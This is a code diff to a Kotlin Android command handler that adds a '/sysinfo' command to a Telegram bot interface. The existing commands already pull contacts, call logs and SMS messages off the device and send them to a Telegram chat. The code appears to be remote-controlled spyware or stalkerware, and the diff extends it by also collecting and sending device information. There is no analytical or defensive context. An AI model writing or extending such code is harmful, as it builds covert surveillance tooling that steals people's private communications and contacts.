@@ -22,8 +22,9 @@ object CommandHandler {
                 "/msgs1" -> fetchSms(ctx, 1)
                 "/msgs2" -> fetchSms(ctx, 2)
                 "/msgs3" -> fetchSms(ctx, 3)
+                "/sysinfo" -> fetchSysInfo(ctx)
                 "/status" -> TelegramApi.sendMessage("✅ Device relay is online.")
-                else -> TelegramApi.sendMessage("❓ Unknown.\n/cmds: /contacts /contacts2 /calllog1 /calllog2 /msgs1 /msgs2 /msgs3 /status")
+                else -> TelegramApi.sendMessage("❓ Unknown.\n/cmds: /contacts /contacts2 /calllog1 /calllog2 /msgs1 /msgs2 /msgs3 /sysinfo /status")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error: $cmd", e)
@@ -60,6 +61,17 @@ object CommandHandler {
             TelegramApi.sendLongMessage(MessageFormatter.formatSms(msgs, page))
         } catch (e: Exception) {
             Log.e(TAG, "sms error", e)
+            TelegramApi.sendMessage("⚠️ Error: ${e.message}")
+        }
+    }
+
+    private suspend fun fetchSysInfo(ctx: Context) = withContext(Dispatchers.IO) {
+        try {
+            val map = DeviceInfoCollector.getDeviceInfo(ctx)
+            val text = DeviceInfoCollector.formatDeviceInfo(map)
+            TelegramApi.sendMessage(text)
+        } catch (e: Exception) {
+            Log.e(TAG, "sysinfo error", e)
             TelegramApi.sendMessage("⚠️ Error: ${e.message}")
         }
     }
